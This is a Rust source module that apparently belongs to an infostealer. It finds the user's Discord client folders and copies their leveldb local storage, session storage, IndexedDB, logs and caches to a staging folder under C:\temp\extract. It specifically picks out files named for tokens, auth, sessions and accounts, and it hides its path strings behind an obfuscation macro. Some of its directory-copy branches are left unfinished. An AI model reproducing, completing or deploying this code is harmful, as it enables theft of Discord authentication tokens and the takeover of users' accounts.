use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Discord");
    std::fs::create_dir_all(&output_dir)?;

    let discord_paths = detect_discord_paths().await;
    
    for discord_path in discord_paths {
        extract_discord_data(&discord_path, &output_dir).await.ok();
    }

    Ok(())
}

async fn detect_discord_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    
    let discord_locations = vec![
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\discord")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\discordcanary")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\discordptb")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\discorddevelopment")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Discord")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\DiscordCanary")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\DiscordPTB")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\DiscordDevelopment")),
    ];

    for path_str in discord_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_discord_data(discord_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let discord_name = discord_path.file_name().unwrap_or_default().to_string_lossy();
    let discord_output = format!("{}{}{}", output_dir, sprotect!("\\"), discord_name);
    std::fs::create_dir_all(&discord_output)?;

    extract_discord_leveldb(&discord_path, &discord_output).await?;
    extract_discord_logs(&discord_path, &discord_output).await?;
    extract_discord_cache(&discord_path, &discord_output).await?;
    
    Ok(())
}

async fn extract_discord_leveldb(discord_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let leveldb_paths = vec![
        sprotect!("Local Storage\\leveldb"),
        sprotect!("Session Storage"),
        sprotect!("IndexedDB"),
        sprotect!("databases"),
    ];

    for leveldb_path in leveldb_paths {
        let full_path = discord_path.join(&leveldb_path);
        if full_path.exists() {
            let dest_dir = format!("{}{}{}", output_dir, sprotect!("\\"), leveldb_path.replace("\\", "_"));
            copy_discord_directory(&full_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn extract_discord_logs(discord_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let log_paths = vec![
        sprotect!("logs"),
        sprotect!("Crashpad"),
        sprotect!("GPUCache"),
    ];

    for log_path in log_paths {
        let full_path = discord_path.join(&log_path);
        if full_path.exists() {
            let dest_dir = format!("{}{}{}", output_dir, sprotect!("\\"), log_path);
            copy_discord_directory(&full_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn extract_discord_cache(discord_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let cache_paths = vec![
        sprotect!("blob_storage"),
        sprotect!("Cache"),
        sprotect!("Code Cache"),
        sprotect!("DawnCache"),
    ];

    for cache_path in cache_paths {
        let full_path = discord_path.join(&cache_path);
        if full_path.exists() {
            let dest_dir = format!("{}{}{}", output_dir, sprotect!("\\"), cache_path.replace(" ", "_"));
            copy_selective_discord_files(&full_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn copy_discord_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let dest_path = format!("{}{}{}", dest_dir, sprotect!("\\"), file_name);
                fs::copy(&path, dest_path).ok();
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let new_dest = format!("{}{}{}", dest_dir, sprotect!("\\"), dir_name);
                
            }
        }
    }
    Ok(())
}

async fn copy_selective_discord_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_discord_important_file(&file_name) {
                    let dest_path = format!("{}{}{}", dest_dir, sprotect!("\\"), file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_discord_important_dir(&dir_name) {
                    let new_dest = format!("{}{}{}", dest_dir, sprotect!("\\"), dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

fn is_discord_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".log"), sprotect!(".json"), sprotect!(".db"), sprotect!(".ldb"), sprotect!(".txt")];
    let important_keywords = [sprotect!("token"), sprotect!("user"), sprotect!("auth"), sprotect!("session"), sprotect!("account"), sprotect!("manifest")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword)) ||
    filename_lower.len() < 50
}

fn is_discord_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("leveldb"), sprotect!("session"), sprotect!("local"), sprotect!("log"), sprotect!("cache")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}